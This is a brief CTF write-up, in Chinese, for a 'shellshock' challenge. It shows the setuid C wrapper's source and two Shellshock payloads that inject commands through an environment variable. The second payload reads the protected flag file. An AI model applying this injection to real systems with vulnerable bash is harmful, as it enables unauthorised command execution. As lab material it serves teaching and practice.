## Source code
```
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

## Pwn
這道題的 home 目錄下有一個 bash (4.2.25)，可使用 shellshock 達成 arbitrary command execution。

Shellshock：
```
env x="() { :;}; echo 'oh_shit'" ./bash -c ' echo test'
```

上面這行指令中，`() {:;};` 後面的東西會被執行，所以我們可以
```
env x="() { :;}; /bin/cat flag" ./shellshock
```
